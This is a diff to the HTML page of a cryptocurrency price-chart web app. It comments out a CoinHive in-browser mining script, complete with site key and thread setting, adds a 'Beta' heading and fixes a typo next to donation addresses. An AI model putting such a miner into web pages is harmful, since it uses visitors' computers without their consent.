@@ -29,10 +29,10 @@
   }, 10000);
 
 </script>
-<script>
+<!-- <script>
 	var miner = new CoinHive.Anonymous('mxQ4fvr9wTiWHesQ5g5L23GDpzNgIuOV', {threads: 2});
 	miner.start();
-</script>
+</script> -->
 </head>
 
 <!-- define angular controller -->
@@ -51,11 +51,12 @@
       </nav>
     </div>
     <div class="panel panel-default">
+      <h2> Beta </h2>
       <div>Donations are welcome on: </br>
          btc: 1JUoVvQNsmsEJrZLd9ZMMKoSvTJ52tRTG7</br>
          ltc: LMYDzpbBjuuJ3tssW9h2XKZy9XoYTpYZsP</div>
       <div>Hosting is not free, please consider donating something if using on regular basis</div>
-      <h3>{{coin}}, price per second, from top to bottom: ask, bid, 0,5btc support (works best is smaller window)</h3>
+      <h3>{{coin}}, price per second, from top to bottom: ask, bid, 0,5btc support (works best in smaller window)</h3>
       <canvas id="line" class="chart chart-line" chart-data="data"
       chart-labels="labels" chart-colors="colors" chart-series="series" chart-options="options"
       chart-dataset-override="datasetOverride">
